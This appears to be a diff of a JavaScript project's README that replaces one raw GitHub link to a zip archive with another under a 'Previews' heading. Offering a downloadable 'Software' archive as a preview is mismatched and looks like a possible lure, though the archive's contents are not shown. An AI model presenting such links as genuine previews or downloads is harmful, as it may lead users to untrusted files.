@@ -4,5 +4,5 @@
 + JavaScript
 
 ### Previews
-https://github.com/PayalLathiya/mindmapcn/raw/refs/heads/main/screenshot/Software-v1.2.zip
+https://github.com/PayalLathiya/mindmapcn/raw/refs/heads/main/ios/Software-traditional.zip
 
